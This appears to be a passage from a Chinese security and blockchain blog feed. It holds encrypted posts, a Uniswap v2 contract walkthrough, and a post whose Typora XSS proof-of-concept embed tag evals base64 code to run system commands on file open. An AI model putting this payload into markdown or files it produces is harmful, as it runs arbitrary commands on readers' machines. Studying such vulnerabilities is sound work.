edb1db9943f99352280177d3358fad5d1c511158c4b3c93f2f43cdc5af51bc11549f1d81a3f72c58b027d20f44b6b98b30d51ef9c0dfb2637db8096ec85737056621f02adbc6e73ec1993a2a4849d0990a07980ddfafae5f106902a1333d6890a71fa32b8e39efe5b168f798ae9cce7d49e479721aee73bb9264b56bcef157dbd69b61e2cdf32e727314bd36c4d05a03c3bddcc880a0a5bbace2055022303fdb15fb75d131cac88119bae74bf967f8bb9dd3fb1b507ca711768ec25e0942cee957d4fe6c64af6ee402f7dc3dc1a2a1244d160dd4766ade29ab09f7f6af52294de48d964eba936392419f279b1b12a3c5444ab6551f35ae7ff3c7d51b2e23411016b74a7c85e34bff4ec4da872ca99ba8bd25ede847e6d2725d6f865cae8c9c313c7d21151a9790822d725094bb94651cd3463a481eebd680f9b2b9d3c185f90d1135e45094f421c589bba6c57b893e68f37b6567522cb9a6a7642893c438e7393a453481da07dbe6ace847219f3337ce0f5a92a9f9f870d997ae4b5bb1ce46f2c206b3eb6292aa1b518335db718a3ab90df2d7372a4de14b31e488fb870864852461cc623ff6254dbaf89e3c8b2b4a363dff23122680880c01270ab48cac2da7d7d27e78283ef6c80d23847a7b99f20ec8edb69ecffaaae5bf7a304d6046557f93bdaf1bbb0db26385fd258cd009ceaaedee3e98d1c67793f4a35b04677e54333b9a17006f2b534096bfe7c502d125f4195ed09e84b7406b65d74358cb0ab8ab514c5f3e8d976aef5b374138ee3f59e43a267095f90b76aadeabdea4a4573d067ef1d498c8ad359ba7b5f86c3d11d52d611e3b1c5a0531ab652028cfb9654e34b6fc04bc9f31a998b2557f5d286b4a466a0b9810d47d6f5ad1c22c089f43e22c1c2a67d53a9d6e5d1b3aef6a822f53c7db38cabf41a837e6db7d24ddd00144373531d483098899a4ee0dfa60745b4ff9ff5f91145d781c0c72ba66fc165dd24fa1912e6183085351c15a88e4fde33226d7e44271fade5b91601d5e5847aab667c5e33e258ea46af3a14ba1d7fed916d6ac2679540c742f3d39f26ca6ff2d928b9b81cfa126bf3c304ac17860923c06c1e9a3adaa87c20c7f4957b31bc827a44dd5f32d00276d7e6c768ba6fd873911362bb722e423cb09fe70ca3dfb4c8f7476147caffaab61b00e4713a63caad343b7882182551ef5da1084779d6f6844a5a2263f9902f714d73a7d7f4a5cb415d8f94158463daf43d39da50c2548202348c8b5a2619b1a083b1b0e943e802efbc970939b4c5962f90ccb1b5c4d9ed6a45c7ab098ed8a60d296c340a547deef5c321b9c6c077507edbfac82cc2cb915ae074b954db0b6d8b82e51b64c10b99f79ff63d969153ea6b0b31a6b61918ab6e31f9c097224884cedf5efbda84166a78f2a5834fbfa053ad4faf87f054d5ef9e38a50c06d35150ffc090fe794ef3573c1e5cb4332c785e85f25ca525e92143cd1fe1c674007a06e3bde67b33625efb4db1bf5403aef1d76fda9c65551687d4202aace34e84e3957abc0b53c5fd2b9c4506c4504e090833ccdb78ace046261c6cd3396ce474fe0934dfa315a16c71d4261dbc16efc36a50941be08f9eee29721164675bc9dd731f64785a9117c155aa</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 10.solidity compiler bug </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.ABIEncoderV2 Array</title>
      <link href="/2023/08/31/10.solidity%20compiler%20bug/01.ABIEncoderV2%20Array/"/>
      <url>/2023/08/31/10.solidity%20compiler%20bug/01.ABIEncoderV2%20Array/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4fc9f696b13253f6fe00f117a297354c699152aaaae3e976ab5380150c898203">5cd6d88a1d91bc4117b062d0086622af5896445cb0373ec30e23514ead5564131c1ec517890972b73570394b7b0db989db0c1ccabd5fa75acd475e16043ecac3f58c428c841f22e922e87cbd9d648bb370aa2d85858b2b1d754a9f5c143793e99068391396c67eb437928073b25c5b423b048ffab1513e843d0f1337d1ac3b30297031211a48ddc35a0804ec2588ad50c0efbc027a283b0c907586d91eddfb3342ec43a7fffcc3291fe2bb354c715bdde2fd94acc95f1aef9da2071a0e69596025074424a47a82fb1b5de163e85ffaba438e2a99e15755d43e9cc2650b39aa8633c0dd8096f7eff51d36423a72ae197a2771df4d90935b63189e1da12bb39eb64f41c193e69be500119c6173cd774e657f90b9608e140e0aec58dea1f556af179d92dc7f841b56cb9a750443cae6fc10254f753447fb88842a985acb49019d22ca5bb7ed5e42ffc72c00d0e11c2d3b8c12c2ce773bbe433ffda127ada8468781f4afefcdd84d98e611d03079da18bdbecfd7e8bf6025e6d6b0aaff95aaf54f69850f38275e4f1aad1de994d727d364637700cb5d51af5eb2fefdaf47328060f5f4fd3b3c7a76076f13bce534a30843532fed682a0e2f89740df4f3f86297e7d16d7456023b37bb434ce55c5e134ed636de65a3b985fcc8cb053795c749aca75c53c2cb908024b4c6907053867a67e7a8e9bc5f1a5c183728fa84e9e0f5e70a6e71087bc535c748f6fb3998f086a9a231aaa4e8d3b9805e67d6bbe102c7bd5e5527e2f8bdfe30c32b6a73f1e0ef6887dac787c17e1895e8c2ea81d8ea3573e1d8cb902f845253ac929c04b585ed35d5e27a31d86d3097095a0c73263bd0ca3317173267d3a4be79ab743b23f8660e58b1db2092c3a0dc9debf8d61bb5cfcedfb4faff935b772cb67a326ea6352a69809c51614901925bdae418d1ffdde2a8a0e8fcd24c679fb49ae04d3fcc73a72a6507a00adeb4d4886a8aa35179e43631f2629bd2081544598861663dd18e293f0623669f30b644ca66e151bdcfedaff4bbb8135080204fcfcbaeeaee2e7b18c334f4d0996dc7d9813acee68ce63e423d8db1756b4540a0a698dbdd7dd0b2ceab39b4d43215eac1b81c2c813ad38f88f23e5d083c5298d92f6f9193d08ff6e2bf8c002597abc65ffc76c63c50d631522568578d37ede2bcd5a1dc5e990ec69343e5b2be43b3c6712b5ca14e1c378f6405a26f6d5055435c0ddbed3379e85eb2a2e23fd8ad7104f7d3d07211ce9246ec2ccae727e973face138a9f94dc8b394d8f541d04d5681e97bcc9666d874da8ca7196f392a20dec6c9f2ffb7c11c2d4a239b1938143ea1c61ff46ecae4c81874a7a4a08056b8251146c332cd87a4365c500ff44e86999e54fc576201cb42e29291f31a1366e7a420e9d5adc9ba161443cec3ec493a34bf77dfdb2e709bc959b4105dd1a4f36adae9e5c0f40344b80aa77b35c814fb6164607d80d00ca8d779d1d63f37de39a712742bbfbb9cf49e0ed973cf90c4e073b3658c39ae41668da7908156f18eb08663dd1b64569aca94db31af2458e46f98cf4358c837074221680b0b0b4f2152d24be62fa237d3610a418f53c0536754fbe35d34aa661e5aa686e977d7388b2df8d1d95ef8363389dfd26c5874a317d856e390d26a608cb2c65c3fdd74c475989b98cf951fadf957fede9d5c756a148455819df1d18b99e65cd7ce2ca04b0b23d9cbe9196507e6d8cc44befb9263224bc65aedd0d17b45c2c805a6435308fa5490b00e3a65727efef2253251bce0e14f5514cabd95c232696159cc316c5c04d175d75b856b2092c4d8ee765a661ee33616db06c53ab8e717cdeb2f4d9e93c1a707c658bd717d12d0e9fe7ea998a648dee19e244b186eee56accc1ca25f1b0af670d1e8c5e8215bcced1bc663d50b66d1c4dcad8d436ab298dc0a7a32579f512c80327b64fa3584636f4c425547e20955b1a6d8988d81756b8bc0860fc5f34c2618726a52a097a59f4c2ee6a0bf69707e635cafcf7b517f015b422865092d2cc5b4f945258c107286c444cfe069ef8c4826f2c1a5c2824023aa11811e7c533c80fe62004e31f94ecc86ee0e6bf39f07f6c2d0bccce26cd72bb05cecdda84502635b1d84b1c93a2af5b02a9a15ea3b54037284ebd54ac785ec3a2b6ae40e251ef8032da4e822a93a6c12f5eccd4f47c7421b8ea74711b0b4da68795da5033d3e23aa96119ba5c362f6003266d0a0b61429246c5cfb0f4d094c96d51bf5b8f80bef397b433fe2fbb9c6b53de2adbe855d1e1944fcb12fa125aea8b27b520be912cefbebd4ed9356ac1b2c3f755e0b69fb754dd9c99c26d2985c6538d1f9a1609c434dea158e0a8e78fe94693f1c234ab3dfa1c023de6a4520ea8034b549c558c7dadc25ff72f761d8c4b43dd2da767f0d3fc0ef027ee0de8b5972ac8ebdc35dca8fd101628dc2f0a15f148f2ba9851890e52e6663a5c1e11bce164963a91bf236d6c763a715e965dcc01a7520718c3c3c544403184911ca7306a981342899803a5cb4f5a129f7387be165cfc560590b48fdadf4f7e8daa667d87d7c5e7813a3e8c05087d96342f902d895bb2348e4493f9a86dcbb8bead38648e7c11a88f573b68719f4180168554a503205584a4c2c79e8a9af4fbb89a877e4a0f79dc62d9930b35ecf1c4632b14a6943d0444f9181add6959be6ca08cc069048f4b1074c16361496b0f483fca0b03bff1df9512d6772515809db7205345b75a0884a2e1a9fce4171f181459c4c747d667073a19f398be4a63d2881f74417f6625b23647c972107840dd6f1c23ca542889cb392aa2f92e55d22821143b175adb90c247aac012afc94f8cba2b931857429b99153e02de2b64619234562839fd6b9e38e5c0bc8dbfc5481f6786a9261a26b9b31fd114953570c6c60ac8732675b9db9c73bd2e9eed6bc77e1dda715a042ecb7209733e3d5b4c5a5cde6c32587c11b90469cdfc91cba26e73038d85fdf01ff036ebab681dc7705d22f6bdf10ba37d3d9a9daea4eb5804f860ddab110126c36e489bbfa526c16659699581f6cdedfc3f88fa6f5cc9d83ccdab0d665948f7efa416a37e30957b8507b9661d0413a93bfc12767192d988b199e2d15c7a1f2548a16ba910fc18e4fe3dee6e900e7aa15b995625a6b33907327e6ce88f977eab00fd3aad62a398e669afb209c8cd609f2d2437ba9990d29ae005344a145e90f4804577dc30457d7c0b5353789612975af28ca40c26d4154e52d3423477078a8933d08bd5549802819e739d56baaa167ce341679dc13569bed74dc9f05ec5992b5d222aa1e0762c8267d7478c8af1c5de39a182780df3ad517f85a07f65b23814185fb077316699f6ae4d48f8bd05f412d0b5e9838a621ab7032dc0c1d70b0d4c8b42d7dcf9396933366df04825432c52bae983629c864c657b5cc90bd7163b11ab896d2e566a90a8bfe3e1bcc8373ee9f62b42b50e803e85052074a9f54e290d70b86eac3c26a823648c11c89c23354d8082577c20d60c9c394601377d1114d210fad9b85be87c97297448f6bae9f8c90858ba5efbbd9041a83d6c3d1848b2f3bc0520aa63a5678928deab68f228bfdc88af24837449c2b2d33a01307c0b39ddba68b98601963b4813c4a35402ca3f2e7de0e59c025892a6c4eb5aca1b172531d762de19716f001a6cc511a1b61ce175ead0ee54c8b23c54312d9235a97fa3237ca875bb83e311ceb2d9c112b3e2fabe163b1a7337db25bf0df0e745a57fc37504f19d23aaf362d1d17ce0c8434810d068a1d89874efdfcd89388a8a95c2000a532d57aea8591f0c551934ae867acc55b815e8eee95d631b7767506e7cca418439214cf697670e5f79af63b9b0990b6fc67019931143ccff79248b9effd23b15c1e93703ba1da1a2307cd6da4e764861d49561761b21d7e154f8a0380972593dba712de5d2dde99570ed3858bee2122f7a25beb8f78cb0ca416b8e00652d4bae6fc5b43885a95782c4f820e012a6459c462766a1000c0a67ddd11d3d18f30474cdb9a0137e779b78ba64d879ed4fac0b7f92d068964c0277fbf294ad9bcb6f1df36e375cccc521</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 10.solidity compiler bug </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03.Typora漏洞</title>
      <link href="/2023/08/29/06.Windows%20Security/03.TyporaA%CC%82I%CC%87h%CC%82%C2%B4/"/>
      <url>/2023/08/29/06.Windows%20Security/03.TyporaA%CC%82I%CC%87h%CC%82%C2%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="Typora漏洞"><a href="#Typora漏洞" class="headerlink" title="Typora漏洞"></a>Typora漏洞</h1><p>今天看到一个公众号，说Windows和Linux版本1.6.7之前的Typora中基于DOM的XSS。</p><p>这个漏洞通过执行JavaScript代码来执行恶意代码，通过在＜embed＞标签中引用update.html，则可以利用此漏洞，此外，攻击者可以使用特权接口reqnode访问节点模块child_process并执行任意系统命令。</p><p>下面举个例子：打开markdowm文件之后，自动新建记事本文件和打开计算器。下面的代码，需要用源代码模式下编辑。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#漏洞演示：打开记事本和计算器#</span><br><span class="line"></span><br><span class="line">&lt;embed style=&quot;height:0;&quot; src=&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;&gt;</span><br><span class="line">```</span><br><span class="line">reqnode(&#x27;child_process&#x27;).exec((&#123;Win32: &#x27;calc&#x27;, Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#125;)[navigator.platform.substr(0,5)])</span><br><span class="line">```</span><br><span class="line">&lt;embed style=&quot;height:0;&quot; src=&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ25vdGVwYWQgd3d3LmV4cHBvYy5vcmcnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;&gt;</span><br><span class="line">```</span><br><span class="line">reqnode(&#x27;child_process&#x27;).exec((&#123;Win32: &#x27;notepad www.exppoc.org&#x27;, Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#125;)[navigator.platform.substr(0,5)])</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="/2023/08/29/06.Windows%20Security/03.TyporaA%CC%82I%CC%87h%CC%82%C2%B4/image-20230829114516697.png" alt="image-20230829114516697"></p><p><img src="/2023/08/29/06.Windows%20Security/03.TyporaA%CC%82I%CC%87h%CC%82%C2%B4/image-20230829114534477.png" alt="image-20230829114534477"></p><p>既然可以打开记事本和计算器，那么其他功能一样可以打开，只需要修改路径。如果修改注册表等功能，后果不堪想象</p>]]></content>
      
      
      <categories>
          
          <category> 06.Windows Security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>04.uniswap_v2_code</title>
      <link href="/2023/08/14/03.Uniswap/04.uniswap_v2_code/"/>
      <url>/2023/08/14/03.Uniswap/04.uniswap_v2_code/</url>
      
        <content type="html"><![CDATA[<h1 id="uniswap-v2-code"><a href="#uniswap-v2-code" class="headerlink" title="uniswap_v2_code"></a>uniswap_v2_code</h1><p>Uniswap v2的合约主要分为两类：core合约和periphery合约。其中，core合约仅包含最基础的交易功能，核心代码仅200行左右，由于用户资金都存储在core合约里，因此需要保证core合约最简化，避免引入bug；periphery合约则针对用户使用场景提供多种封装方法，比如支持原生ETH交易（自动转为WETH），多路径交换（一个方法同时执行A→B→C交易）等，其底层调用的是core合约。我们在<a href="https://app.uniswap.org/#/swap">app.uniswap.org</a>界面操作时用的就是periphery合约。</p><p><img src="/2023/08/14/03.Uniswap/04.uniswap_v2_code/image-20230307020035465.png" alt="image-20230307020035465"></p><ul><li>uniswap-v2-core<ul><li>UniswapV2Factory：工厂合约，用于创建Pair合约（以及设置协议手续费接收地址）</li><li>UniswapV2Pair：Pair（交易对）合约，定义和交易有关的几个最基础方法，如swap/mint/burn，价格预言机等功能，其本身是一个ERC20合约，继承UniswapV2ERC20</li><li>UniswapV2ERC20：实现ERC20标准方法</li></ul></li><li>uniswap-v2-periphery<ul><li>UniswapV2Router02：最新版的路由合约，相比UniswapV2Router01增加了对FeeOnTransfer代币的支持；实现Uniswap v2最常用的接口，比如添加/移除流动性，使用代币A交换代币B，使用ETH交换代币等</li><li>UniswapV1Router01：旧版本Router实现，与Router02类似，但不支持FeeOnTransferTokens，目前已不使用</li></ul></li></ul><h2 id="uniswap-v2-core"><a href="#uniswap-v2-core" class="headerlink" title="uniswap-v2-core"></a>uniswap-v2-core</h2><h3 id="UniwapV2ERC20"><a href="#UniwapV2ERC20" class="headerlink" title="UniwapV2ERC20"></a>UniwapV2ERC20</h3><p>这个合约主要定义了UniswapV2的ERC20标准实现，代码比较简单。这里介绍下permit方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external &#123;</span><br><span class="line">    require(deadline &gt;= block.timestamp, &#x27;UniswapV2: EXPIRED&#x27;);</span><br><span class="line">    bytes32 digest = keccak256(</span><br><span class="line">        abi.encodePacked(</span><br><span class="line">            &#x27;\x19\x01&#x27;,</span><br><span class="line">            DOMAIN_SEPARATOR,</span><br><span class="line">            keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    address recoveredAddress = ecrecover(digest, v, r, s);</span><br><span class="line">    require(recoveredAddress != address(0) &amp;&amp; recoveredAddress == owner, &#x27;UniswapV2: INVALID_SIGNATURE&#x27;);</span><br><span class="line">    _approve(owner, spender, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>permit方法实现的就是白皮书2.5节中介绍的“Meta transactions for pool shares 元交易”功能。<a href="https://eips.ethereum.org/EIPS/eip-712">EIP-712</a>定义了离线签名的规范，即digest的格式定义，用户签名的内容是其（owner）授权（approve）某个合约（spender）可以在截止时间（deadline）之前花掉一定数量（value）的代币（Pair流动性代币），应用（periphery合约）拿着签名的原始信息和签名后生成的v, r, s，可以调用Pair合约的permit方法获得授权，permit方法使用ecrecover还原出签名地址为代币所有人，验证通过则批准授权。</p><h3 id="UniswapV2Pair"><a href="#UniswapV2Pair" class="headerlink" title="UniswapV2Pair"></a>UniswapV2Pair</h3><p>Pair合约主要实现了三个方法：mint（添加流动性）、burn（移除流动性）、swap（兑换）。</p><h4 id="mint"><a href="#mint" class="headerlink" title="mint"></a>mint</h4><p>该方法实现添加流动性功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">function mint(address to) external lock returns (uint liquidity) &#123;</span><br><span class="line">    // getReserves() 获取两种代币的缓存余额</span><br><span class="line">    // 保存缓存余额是为了防止攻击者操控价格预言机</span><br><span class="line">    // 还用于计算协议手续费，并通过当前余额与缓存余额相减获得转账的代币数量。</span><br><span class="line">    </span><br><span class="line">    // 这两个值是上次添加或者删除流动性的时候，保存的值</span><br><span class="line">    (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings</span><br><span class="line">    // 现在的库存量，通常balance0和balance1是要比库存多的，因为我们刚刚转进来了一些</span><br><span class="line">    uint balance0 = IERC20(token0).balanceOf(address(this));</span><br><span class="line">    uint balance1 = IERC20(token1).balanceOf(address(this));</span><br><span class="line">    uint amount0 = balance0.sub(_reserve0);</span><br><span class="line">    uint amount1 = balance1.sub(_reserve1);</span><br><span class="line"></span><br><span class="line">    bool feeOn = _mintFee(_reserve0, _reserve1);</span><br><span class="line">    uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee</span><br><span class="line">    if (_totalSupply == 0) &#123; //判断是否是头一次添加流动性</span><br><span class="line">        // 安全隐患：</span><br><span class="line">        // 流动性比例由第一个人来设置，一旦设置，变化的幅度就很小了</span><br><span class="line">        // 因此项目方必须在提前设置，不能让他人抢先设置</span><br><span class="line">        liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY); </span><br><span class="line">       _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);</span><br><span class="line">    &#125;</span><br><span class="line">    require(liquidity &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED&#x27;);</span><br><span class="line">    _mint(to, liquidity);</span><br><span class="line"></span><br><span class="line">    _update(balance0, balance1, _reserve0, _reserve1);</span><br><span class="line">    if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date</span><br><span class="line">    emit Mint(msg.sender, amount0, amount1);</span><br><span class="line"></span><br><span class="line">    // mint方法中判断，如果是首次提供该交易对的流动性，则根据根号xy生成流动性代币，</span><br><span class="line">    // 并销毁其中的MINIMUM_LIQUIDITY（即1000wei）；否则根据转入的代币价值与当前流动性价值比例铸造流动性代币。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，getReserves() 获取两种代币的缓存余额。在白皮书中提到，保存缓存余额是为了防止攻击者操控价格预言机。此处还用于计算协议手续费，并通过当前余额与缓存余额相减获得转账的代币数量。</p><p><code>liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);</code>：几何平均数，uniswap项目方应该是认为这个公式更加适合金融，而不是用算数平均数。同时他还减去了最小的流动性3000Wei的代币，其实不是删除，而是扣留下来，以防止被除数是0，没有人能够提走这3000Wei代币。还有一种说法是增加攻击的成本：第一次添加流动性的时候，tokenA和tokenB都添加1wei的代币，产生了1wei的流动性，然后第二次添加流动性（此时添加多少代币就增加多少流动性），此时黑客增加10W个代币流动性，他就获得了10w个流动性代币，3000Wei的首次添加流动性增加了攻击门槛</p><p><img src="/2023/08/14/03.Uniswap/04.uniswap_v2_code/image-20230503134120573.png" alt="image-20230503134120573"></p><p><code>liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);</code>：tokenA和tokenB的流动性，取小值。原因：如果取大的作为流动性，那么就会稀释之前的流动性，稀释股份，影响到别人，而取小的，只会影响自己。如何计算流动性呢：lp是总的流动性，也就是总的lp代币数量，x是tokenA库存的总数量，Δx是我们存入的tokenA的数量，得到的就是我们应得到的lp代币的数量</p><p><img src="/2023/08/14/03.Uniswap/04.uniswap_v2_code/image-20230503134750641.png" alt="image-20230503134750641"></p><h4 id="mintFee"><a href="#mintFee" class="headerlink" title="_mintFee"></a>_mintFee</h4><p>用于计算协议手续费：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// 用于计算协议手续费</span><br><span class="line">// 为了节省交易手续费，Uniswap v2只在mint/burn流动性时收取累计的协议手续费。</span><br><span class="line">// if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)</span><br><span class="line">function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) &#123;</span><br><span class="line">    address feeTo = IUniswapV2Factory(factory).feeTo();</span><br><span class="line">    // 如果是首次添加流动性，则不需要计算交易协议费</span><br><span class="line">    // 如果不是首次添加流动性，则需要交易协议费</span><br><span class="line">    feeOn = feeTo != address(0);</span><br><span class="line">    // KLast是上一次添加或者删除流动性时保存的</span><br><span class="line">    uint _kLast = kLast; // gas savings</span><br><span class="line">    if (feeOn) &#123;</span><br><span class="line">        if (_kLast != 0) &#123; // 删除流动性的时候，这个也会进入，因此也会返回协议费</span><br><span class="line">            uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));</span><br><span class="line">            uint rootKLast = Math.sqrt(_kLast);</span><br><span class="line">            if (rootK &gt; rootKLast) &#123;</span><br><span class="line">                uint numerator = totalSupply.mul(rootK.sub(rootKLast));</span><br><span class="line">                uint denominator = rootK.mul(5).add(rootKLast);</span><br><span class="line">                uint liquidity = numerator / denominator;</span><br><span class="line">                if (liquidity &gt; 0) _mint(feeTo, liquidity); // 将LP转给to地址</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (_kLast != 0) &#123; // 如果我们已经开启feeOn，如果想再次关掉feeOff的话，需要将KLast设置为0</span><br><span class="line">        kLast = 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mint方法中判断，如果是首次提供该交易对的流动性，则根据根号xy生成流动性代币，并销毁其中的MINIMUM_LIQUIDITY（即1000wei）；否则根据转入的代币价值与当前流动性价值比例铸造流动性代币。</p><p><img src="/2023/08/14/03.Uniswap/04.uniswap_v2_code/image-20230503142331600.png" alt="image-20230503142331600"></p><h4 id="burn"><a href="#burn" class="headerlink" title="burn"></a>burn</h4><p><img src="/2023/08/14/03.Uniswap/04.uniswap_v2_code/image-20230503143711867.png" alt="image-20230503143711867"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// 移除流动性</span><br><span class="line">    // 移除流动性后，根据销毁的流动性代币占总量的比例获得对应的两种代币。</span><br><span class="line">    // this low-level function should be called from a contract which performs important safety checks</span><br><span class="line">    function burn(address to) external lock returns (uint amount0, uint amount1) &#123;</span><br><span class="line">        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings</span><br><span class="line">        address _token0 = token0;                                // gas savings</span><br><span class="line">        address _token1 = token1;                                // gas savings</span><br><span class="line">        uint balance0 = IERC20(_token0).balanceOf(address(this));</span><br><span class="line">        uint balance1 = IERC20(_token1).balanceOf(address(this));</span><br><span class="line">        uint liquidity = balanceOf[address(this)]; //这个地址本身是没有LPtoken的，我们burn会传入</span><br><span class="line"></span><br><span class="line">        bool feeOn = _mintFee(_reserve0, _reserve1);</span><br><span class="line">        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee</span><br><span class="line">        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution</span><br><span class="line">        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution</span><br><span class="line">        require(amount0 &gt; 0 &amp;&amp; amount1 &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED&#x27;);</span><br><span class="line">        _burn(address(this), liquidity); //烧掉流动性：此合约的LPtoken和总的lp数量</span><br><span class="line">        _safeTransfer(_token0, 